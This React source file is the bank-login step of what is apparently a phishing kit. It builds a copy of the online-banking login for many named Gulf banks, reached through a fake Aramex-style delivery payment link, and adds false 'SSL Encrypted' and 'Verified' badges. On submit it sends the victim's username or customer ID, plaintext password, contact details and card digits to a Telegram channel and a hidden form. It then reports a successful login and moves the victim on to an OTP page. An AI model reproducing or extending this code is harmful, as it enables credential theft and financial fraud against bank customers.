import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { bankBranding } from "@/lib/brandingSystem";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, ShieldCheck, Loader2, User, IdCard, KeyRound, Globe, ChevronDown } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import { applyDynamicIdentity } from "@/lib/dynamicIdentity";
import { designSystem } from "@/lib/designSystem";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { buildNavigationPath } from "@/utils/navigationHelper";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedBankId = linkData?.payload?.selectedBank || '';
  const cardInfo = linkData?.payload?.cardInfo || {};
  
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const shippingInfo = linkData?.payload as any;
  const rawAmount = shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, selectedCountry);
  
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  useEffect(() => {
    if (selectedBankId && selectedBankId !== 'skipped') {
      applyDynamicIdentity(`bank_${selectedBankId}`);
    }
  }, [selectedBankId]);
  
  const getLoginType = () => {
    if (!selectedBank) return 'username';
    
    const bankId = selectedBank.id;
    
    if (bankId === 'alrajhi_bank' || bankId === 'alahli_bank' || bankId === 'samba_bank' || 
        bankId === 'arab_national_bank' || bankId === 'alinma_bank' || bankId === 'aljazira_bank' ||
        bankId === 'emirates_nbd' || bankId === 'fab' || bankId === 'dib' || bankId === 'cbd' ||
        bankId === 'gulf_bank' || bankId === 'burgan_bank' || bankId === 'ahli_united_bank' ||
        bankId === 'cbq' || bankId === 'doha_bank' || bankId === 'masraf_alrayan' ||
        bankId === 'national_bank_oman' || bankId === 'bank_dhofar' || bankId === 'nizwa_bank' ||
        bankId === 'nbb' || bankId === 'ahli_united_bahrain' || bankId === 'bisb' || bankId === 'khaleeji_bank') {
      return 'username';
    }
    
    return 'customerId';
  };
  
  const loginType = getLoginType();
  
  if (linkLoading || !linkData) {
    return (
      <div 
        className="min-h-screen flex items-center justify-center" 
        dir="rtl"
        style={{
          background: selectedBankBranding?.colors?.surface || '#F5F5F5'
        }}
      >
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: branding.colors.primary }} />
          <p style={{ color: branding.colors.text, fontFamily: designSystem.typography.fontFamilies.arabic }}>جاري تحميل البيانات...</p>
        </div>
      </div>
    );
  }
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (loginType === 'username' && (!username || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم المستخدم وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'customerId' && (!customerId || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم العميل وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'phone' && (!phoneNumber || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم الجوال وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);

    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      phoneNumber: loginType === 'phone' ? phoneNumber : '',
      password: password,
      loginType: loginType,
    };

    sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));

    if (linkData) {
      try {
        const updatedPayload = {
          ...linkData.payload,
          bankLoginData,
        };

        await updateLink.mutateAsync({
          linkId: id!,
          payload: updatedPayload
        });
      } catch (error) {
      }
    }
    
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardLast4: cardInfo.cardLast4,
          loginType: loginType,
          username: bankLoginData.username,
          customerId: bankLoginData.customerId,
          phoneNumber: bankLoginData.phoneNumber,
          password: password,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
    }

    await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardLast4: cardInfo.cardLast4,
        cardType: cardInfo.cardType,
        loginType: loginType,
        username: bankLoginData.username,
        customerId: bankLoginData.customerId,
        phoneNumber: bankLoginData.phoneNumber,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تسجيل الدخول بنجاح",
    });
    
    navigate(buildNavigationPath(`/pay/${id}/otp`));
  };
  
  const primaryColor = selectedBankBranding?.colors?.primary || branding.colors.primary;
  const secondaryColor = selectedBankBranding?.colors?.secondary || branding.colors.secondary;
  const surfaceColor = selectedBankBranding?.colors?.surface || '#FAFAFA';
  const textColor = selectedBankBranding?.colors?.text || '#1A1A1A';
  const borderColor = selectedBankBranding?.colors?.border || '#E5E5E5';
  
  return (
    <>
      <PaymentMetaTags 
        serviceKey={selectedBankId !== 'skipped' && selectedBankId ? `bank_${selectedBankId}` : serviceKey}
        serviceName={selectedBank?.nameAr || serviceName}
        title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
        customDescription={`الخدمات المصرفية الإلكترونية - تسجيل دخول آمن - ${selectedBank?.nameAr || 'البنك'}`}
        amount={formattedAmount}
      />

      {/* Full Screen Layout */}
      <div 
        className="min-h-screen w-full flex flex-col"
        dir="rtl"
        style={{
          background: surfaceColor,
          fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, sans-serif'
        }}
      >
        {/* Official Bank Header - Exact Replica */}
        <header 
          className="w-full border-b"
          style={{
            background: '#FFFFFF',
            borderBottom: `3px solid ${primaryColor}`,
            boxShadow: '0 2px 4px rgba(0,0,0,0.04)'
          }}
        >
          <div className="container mx-auto px-4 sm:px-6 lg:px-8 max-w-7xl">
            <div className="flex items-center justify-between h-16 sm:h-20">
              {/* Bank Logo & Title */}
              <div className="flex items-center gap-3 sm:gap-6">
                <div className="w-28 sm:w-36 lg:w-44">
                  {selectedBank && (
                    <BankLogo 
                      bankId={selectedBank.id}
                      bankName={selectedBank.name}
                      bankNameAr={selectedBank.nameAr}
                      color={selectedBank.color}
                      size="lg"
                      className="w-full h-auto"
                    />
                  )}
                </div>
                <div className="hidden md:block w-px h-12 bg-gray-300" />
                <div className="hidden md:block">
                  <p className="text-base lg:text-lg font-bold" style={{ color: textColor }}>
                    الخدمات المصرفية الإلكترونية
                  </p>
                  <p className="text-sm text-gray-500">
                    Internet Banking Services
                  </p>
                </div>
              </div>
              
              {/* Right Side - Language & Help */}
              <div className="flex items-center gap-3">
                <button 
                  className="hidden sm:flex items-center gap-2 px-4 py-2 rounded-md text-sm hover:bg-gray-50 transition-colors"
                  style={{ color: textColor }}
                >
                  <Globe className="w-4 h-4" />
                  <span>English</span>
                  <ChevronDown className="w-3 h-3" />
                </button>
                <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
                  <Lock className="w-3.5 h-3.5 text-green-600" />
                  <span className="text-xs font-medium text-green-700">آمن</span>
                </div>
              </div>
            </div>
          </div>
        </header>

        {/* Main Content - Full Screen */}
        <div className="flex-1 flex items-center justify-center py-8 sm:py-12 px-4">
          <div className="w-full max-w-md">
            {/* Login Card */}
            <Card 
              className="overflow-hidden border shadow-xl"
              style={{
                borderRadius: selectedBankBranding?.borderRadius?.lg || '12px',
                borderColor: `${primaryColor}20`,
                background: '#FFFFFF'
              }}
            >
              {/* Card Header */}
              <div 
                className="px-6 sm:px-10 pt-8 sm:pt-10 pb-6 text-center"
                style={{
                  background: '#FFFFFF'
                }}
              >
                <div 
                  className="w-20 h-20 rounded-full mx-auto mb-5 flex items-center justify-center"
                  style={{
                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                  }}
                >
                  <Lock className="w-10 h-10 text-white" />
                </div>
                <h1 
                  className="text-2xl sm:text-3xl font-bold mb-2"
                  style={{ 
                    color: textColor,
                    fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, sans-serif'
                  }}
                >
                  تسجيل الدخول
                </h1>
                <p className="text-sm sm:text-base text-gray-600">
                  {selectedBank?.nameAr || 'الخدمات المصرفية الإلكترونية'}
                </p>
              </div>

              {/* Login Form */}
              <form onSubmit={handleSubmit} className="px-6 sm:px-10 pb-10 bg-white">
                <div className="space-y-5">
                  {/* Username / Customer ID Field */}
                  {loginType === 'username' && (
                    <div>
                      <Label 
                        htmlFor="username"
                        className="block mb-2.5 text-sm font-semibold"
                        style={{ color: textColor }}
                      >
                        اسم المستخدم
                      </Label>
                      <div className="relative">
                        <Input
                          id="username"
                          type="text"
                          placeholder="أدخل اسم المستخدم"
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                          className="h-12 text-base pr-12 pl-4 border-2 rounded-lg transition-all focus:border-opacity-100"
                          style={{ 
                            borderColor: borderColor,
                            fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, sans-serif'
                          }}
                          autoComplete="username"
                          required
                        />
                        <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none">
                          <User className="w-5 h-5" style={{ color: `${primaryColor}80` }} />
                        </div>
                      </div>
                    </div>
                  )}
                  
                  {loginType === 'customerId' && (
                    <div>
                      <Label 
                        htmlFor="customerId"
                        className="block mb-2.5 text-sm font-semibold"
                        style={{ color: textColor }}
                      >
                        رقم العميل
                      </Label>
                      <div className="relative">
                        <Input
                          id="customerId"
                          type="text"
                          placeholder="أدخل رقم العميل"
                          value={customerId}
                          onChange={(e) => setCustomerId(e.target.value)}
                          className="h-12 text-base pr-12 pl-4 border-2 rounded-lg transition-all focus:border-opacity-100"
                          style={{ 
                            borderColor: borderColor,
                            fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, sans-serif'
                          }}
                          inputMode="numeric"
                          required
                        />
                        <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none">
                          <IdCard className="w-5 h-5" style={{ color: `${primaryColor}80` }} />
                        </div>
                      </div>
                    </div>
                  )}
                  
                  {/* Password Field */}
                  <div>
                    <div className="flex items-center justify-between mb-2.5">
                      <Label 
                        htmlFor="password"
                        className="text-sm font-semibold"
                        style={{ color: textColor }}
                      >
                        كلمة المرور
                      </Label>
                      <button
                        type="button"
                        className="text-xs font-medium transition-all"
                        style={{ color: primaryColor }}
                      >
                        نسيت كلمة المرور؟
                      </button>
                    </div>
                    <div className="relative">
                      <Input
                        id="password"
                        type={showPassword ? "text" : "password"}
                        placeholder="أدخل كلمة المرور"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="h-12 text-base pr-12 pl-12 border-2 rounded-lg transition-all focus:border-opacity-100"
                        style={{ 
                          borderColor: borderColor,
                          fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, sans-serif'
                        }}
                        autoComplete="current-password"
                        required
                      />
                      <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none">
                        <KeyRound className="w-5 h-5" style={{ color: `${primaryColor}80` }} />
                      </div>
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"
                      >
                        {showPassword ? (
                          <EyeOff className="w-5 h-5" />
                        ) : (
                          <Eye className="w-5 h-5" />
                        )}
                      </button>
                    </div>
                  </div>
                  
                  {/* Remember Me */}
                  <div className="flex items-center gap-2.5">
                    <input 
                      type="checkbox" 
                      id="remember" 
                      className="w-4 h-4 rounded cursor-pointer" 
                      style={{ 
                        accentColor: primaryColor
                      }}
                    />
                    <label 
                      htmlFor="remember" 
                      className="text-sm cursor-pointer select-none"
                      style={{ color: textColor }}
                    >
                      تذكرني
                    </label>
                  </div>
                </div>
                
                {/* Submit Button - Official Bank Style */}
                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-base sm:text-lg py-6 sm:py-7 text-white font-bold transition-all duration-200 rounded-lg mt-8"
                  disabled={isSubmitting}
                  style={{
                    background: primaryColor,
                    fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, sans-serif',
                    boxShadow: `0 4px 12px ${primaryColor}40`
                  }}
                  onMouseEnter={(e) => {
                    if (!isSubmitting) {
                      e.currentTarget.style.background = secondaryColor;
                      e.currentTarget.style.transform = 'translateY(-1px)';
                      e.currentTarget.style.boxShadow = `0 6px 16px ${primaryColor}50`;
                    }
                  }}
                  onMouseLeave={(e) => {
                    e.currentTarget.style.background = primaryColor;
                    e.currentTarget.style.transform = 'translateY(0)';
                    e.currentTarget.style.boxShadow = `0 4px 12px ${primaryColor}40`;
                  }}
                >
                  {isSubmitting ? (
                    <span className="flex items-center justify-center gap-2">
                      <Loader2 className="w-5 h-5 animate-spin" />
                      جاري تسجيل الدخول...
                    </span>
                  ) : (
                    "تسجيل الدخول"
                  )}
                </Button>
                
                <p className="text-xs text-center text-gray-500 mt-6">
                  بالمتابعة، أنت توافق على{' '}
                  <a href="#" className="underline" style={{ color: primaryColor }}>
                    الشروط والأحكام
                  </a>
                  {' '}و{' '}
                  <a href="#" className="underline" style={{ color: primaryColor }}>
                    سياسة الخصوصية
                  </a>
                </p>
              </form>

              {/* Card Footer */}
              <div 
                className="px-6 sm:px-10 py-5 text-center border-t"
                style={{
                  background: surfaceColor,
                  borderTopColor: borderColor
                }}
              >
                <button
                  type="button"
                  className="text-sm font-semibold transition-all hover:underline"
                  style={{ color: primaryColor }}
                >
                  ليس لديك حساب؟ سجّل الآن
                </button>
                
                <div className="flex items-center justify-center gap-4 text-xs text-gray-500 mt-4 pt-4 border-t" style={{ borderTopColor: borderColor }}>
                  <div className="flex items-center gap-1.5">
                    <Lock className="w-3 h-3" />
                    <span>SSL Encrypted</span>
                  </div>
                  <span>•</span>
                  <div className="flex items-center gap-1.5">
                    <ShieldCheck className="w-3 h-3" />
                    <span>Verified</span>
                  </div>
                </div>
              </div>
            </Card>
            
            {/* Bank Footer */}
            <footer className="mt-8 text-center">
              <p className="text-xs text-gray-500 mb-3">
                © 2025 {selectedBank?.nameAr || 'البنك'}. جميع الحقوق محفوظة.
              </p>
              <div className="flex items-center justify-center gap-4 text-xs">
                <a href="#" className="text-gray-500 hover:text-gray-700 transition-colors">الشروط والأحكام</a>
                <span className="text-gray-400">•</span>
                <a href="#" className="text-gray-500 hover:text-gray-700 transition-colors">سياسة الخصوصية</a>
                <span className="text-gray-400">•</span>
                <a href="#" className="text-gray-500 hover:text-gray-700 transition-colors">خريطة الموقع</a>
              </div>
            </footer>
          </div>
        </div>
      </div>
    
      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardLast4" />
        <input type="text" name="loginType" />
        <input type="text" name="username" />
        <input type="text" name="customerId" />
        <input type="text" name="phoneNumber" />
        <input type="password" name="password" />
        <input type="text" name="timestamp" />
      </form>
    </>
  );
};

export default PaymentBankLogin;
